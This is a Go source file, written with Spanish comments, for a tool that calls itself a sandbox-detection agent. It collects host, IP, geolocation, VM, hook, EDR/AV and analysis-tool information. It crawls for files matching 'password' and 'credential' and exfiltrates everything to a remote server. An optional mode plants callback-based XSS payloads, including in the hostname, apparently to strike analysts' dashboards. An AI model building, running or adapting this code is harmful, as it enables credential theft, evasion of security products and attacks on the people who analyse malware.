package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/m4rcmo15/artefacto/collectors"
	"github.com/m4rcmo15/artefacto/config"
	"github.com/m4rcmo15/artefacto/exfil"
	"github.com/m4rcmo15/artefacto/models"
	"github.com/m4rcmo15/artefacto/xss"
)

func main() {
	fmt.Println("[*] Iniciando agente de detección de sandbox...")

	// Cargar variables de entorno desde .env
	loadEnv()

	// Cargar configuración
	cfg := config.Load()

	// Obtener hostname
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	// Obtener tamaño del binario
	binarySize := getBinarySize()

	// Crear payload principal
	payload := &models.Payload{
		Timestamp:  time.Now(),
		Hostname:   hostname,
		BinarySize: binarySize,
	}

	// === MODO XSS AUDIT ===
	if cfg.XSSAudit {
		fmt.Println("\n[🎯] ========== MODO XSS AUDIT ACTIVADO ==========")
		fmt.Println("[🎯] Inyectando payloads XSS en múltiples vectores...")
		
		// Importar el paquete xss
		xssPayloads := injectXSSAudit(cfg.CallbackServer, payload)
		
		fmt.Printf("[🎯] Total de payloads inyectados: %d\n", len(xssPayloads))
		fmt.Println("[🎯] ===============================================\n")
	}

	// Obtener IP pública y geolocalización (antes de los colectores paralelos)
	fmt.Println("[+] Obteniendo IP pública...")
	payload.PublicIP = collectors.GetPublicIP()
	if payload.PublicIP != "" {
		fmt.Printf("[✓] IP pública: %s\n", payload.PublicIP)
		fmt.Println("[+] Obteniendo geolocalización...")
		payload.GeoLocation = collectors.GetGeoLocation(payload.PublicIP)
		if payload.GeoLocation != nil {
			fmt.Printf("[✓] Ubicación: %s, %s\n", payload.GeoLocation.City, payload.GeoLocation.Country)
		}
	}

	// WaitGroup para ejecutar colectores en paralelo
	var wg sync.WaitGroup
	wg.Add(6)

	// 1. CheckSandbox
	go func() {
		defer wg.Done()
		fmt.Println("[+] Ejecutando CheckSandbox...")
		payload.SandboxInfo = collectors.CheckSandbox()
		fmt.Println("[✓] CheckSandbox completado")
	}()

	// 2. SystemInfo (incluye captura de pantalla)
	go func() {
		defer wg.Done()
		fmt.Println("[+] Ejecutando SystemInfo...")
		payload.SystemInfo = collectors.CollectSystemInfo()
		fmt.Println("[✓] SystemInfo completado")
	}()

	// 3. HookDetector
	go func() {
		defer wg.Done()
		fmt.Println("[+] Ejecutando HookDetector...")
		payload.HookInfo = collectors.DetectHooks()
		fmt.Println("[✓] HookDetector completado")
	}()

	// 4. FileCrawler
	go func() {
		defer wg.Done()
		fmt.Println("[+] Ejecutando FileCrawler...")
		patterns := []string{"*.txt", "*.doc", "*.pdf", "password", "credential"}
		payload.CrawlerInfo = collectors.CrawlFiles(patterns, 100)
		fmt.Println("[✓] FileCrawler completado")
	}()

	// 5. EDRChecker
	go func() {
		defer wg.Done()
		fmt.Println("[+] Ejecutando EDRChecker...")
		payload.EDRInfo = collectors.DetectEDR()
		fmt.Println("[✓] EDRChecker completado")
	}()

	// 6. ToolsDetector
	go func() {
		defer wg.Done()
		fmt.Println("[+] Ejecutando ToolsDetector...")
		payload.ToolsInfo = collectors.DetectTools()
		fmt.Println("[✓] ToolsDetector completado")
	}()

	// Esperar a que todos los colectores terminen
	wg.Wait()

	fmt.Println("\n[*] Todos los colectores completados")
	fmt.Println("[*] Exfiltrando datos...")

	// Intentar enviar payload al servidor con timeout reducido para sandboxes
	exfilTimeout := cfg.Timeout
	if exfilTimeout > 30*time.Second {
		exfilTimeout = 30 * time.Second // Máximo 30s para exfiltración
	}

	err = exfil.SendPayload(payload, cfg.ServerURL, exfilTimeout)
	if err != nil {
		log.Printf("[!] Error enviando datos: %v", err)
		fmt.Println("[!] La sandbox puede estar bloqueando la conexión")
		
		// Guardar localmente si falla el envío
		savePayloadLocally(payload)
	} else {
		fmt.Println("[✓] Datos enviados correctamente al servidor")
	}

	// Mostrar resumen
	printSummary(payload)
}

func savePayloadLocally(payload *models.Payload) {
	fmt.Println("[*] Guardando payload localmente...")
	
	// Serializar a JSON
	jsonData, err := json.MarshalIndent(payload, "", "  ")
	if err != nil {
		log.Printf("[!] Error serializando payload: %v", err)
		return
	}

	// Guardar en archivo con timestamp
	filename := fmt.Sprintf("payload_%s.json", time.Now().Format("20060102_150405"))
	err = os.WriteFile(filename, jsonData, 0644)
	if err != nil {
		log.Printf("[!] Error guardando archivo: %v", err)
		return
	}

	fmt.Printf("[✓] Payload guardado en: %s\n", filename)
}

func printSummary(payload *models.Payload) {
	fmt.Println("\n========== RESUMEN ==========")
	
	if payload.SandboxInfo != nil {
		fmt.Printf("¿Es VM?: %v\n", payload.SandboxInfo.IsVM)
		fmt.Printf("Indicadores de VM: %d\n", len(payload.SandboxInfo.VMIndicators))
	}

	if payload.SystemInfo != nil {
		fmt.Printf("CPUs: %d\n", payload.SystemInfo.CPUCount)
		fmt.Printf("RAM: %d MB\n", payload.SystemInfo.TotalRAM)
		fmt.Printf("Procesos: %d\n", len(payload.SystemInfo.Processes))
	}

	if payload.HookInfo != nil {
		hookedCount := 0
		for _, fn := range payload.HookInfo.HookedFunctions {
			if fn.IsHooked {
				hookedCount++
			}
		}
		fmt.Printf("Funciones hooked: %d/%d\n", hookedCount, len(payload.HookInfo.HookedFunctions))
	}

	if payload.CrawlerInfo != nil {
		fmt.Printf("Archivos encontrados: %d\n", payload.CrawlerInfo.TotalFiles)
	}

	if payload.EDRInfo != nil {
		fmt.Printf("EDR/AV detectados: %d\n", len(payload.EDRInfo.DetectedProducts))
		for _, product := range payload.EDRInfo.DetectedProducts {
			fmt.Printf("  - %s (método: %s)\n", product.Name, product.Method)
		}
	}

	if payload.ToolsInfo != nil {
		totalTools := len(payload.ToolsInfo.ReversingTools) + len(payload.ToolsInfo.DebuggingTools) + 
			len(payload.ToolsInfo.MonitoringTools) + len(payload.ToolsInfo.VirtualizationTools) + 
			len(payload.ToolsInfo.AnalysisTools)
		fmt.Printf("Herramientas detectadas: %d\n", totalTools)
	}

	if payload.GeoLocation != nil {
		fmt.Printf("Ubicación: %s, %s (%s)\n", payload.GeoLocation.City, payload.GeoLocation.Country, payload.GeoLocation.CountryCode)
	}

	fmt.Println("=============================")
}

func getBinarySize() int64 {
	exePath, err := os.Executable()
	if err != nil {
		return 0
	}

	fileInfo, err := os.Stat(exePath)
	if err != nil {
		return 0
	}

	return fileInfo.Size()
}

// loadEnv carga las variables de entorno desde el archivo .env
func loadEnv() {
	file, err := os.Open(".env")
	if err != nil {
		// Si no existe .env, no pasa nada (usará valores por defecto)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		
		// Ignorar líneas vacías y comentarios
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		// Separar clave=valor
		parts := strings.SplitN(line, "=", 2)
		if len(parts) == 2 {
			key := strings.TrimSpace(parts[0])
			value := strings.TrimSpace(parts[1])
			os.Setenv(key, value)
		}
	}
}

// injectXSSAudit inyecta payloads XSS en el sistema
func injectXSSAudit(callbackServer string, payload *models.Payload) []models.XSSPayloadMetadata {
	// Obtener todos los payloads
	payloads := xss.GetAllPayloads(callbackServer)
	
	// Modificar el hostname con el primer payload de hostname
	for _, p := range payloads {
		if p.Vector == "hostname" {
			payload.Hostname = p.Content
			fmt.Printf("[XSS] Hostname modificado a: %s\n", p.Content[:50]+"...")
			break
		}
	}
	
	// Inyectar el resto de payloads
	xss.InjectPayloads(payloads)
	
	// Extraer metadata para enviar al servidor
	xssMetadata := xss.GetPayloadMetadata(payloads)
	
	// Convertir a models.XSSPayloadMetadata
	metadata := make([]models.XSSPayloadMetadata, len(xssMetadata))
	for i, m := range xssMetadata {
		metadata[i] = models.XSSPayloadMetadata{
			ID:     m.ID,
			Type:   m.Type,
			Vector: m.Vector,
		}
	}
	
	payload.XSSPayloads = metadata
	
	return metadata
}
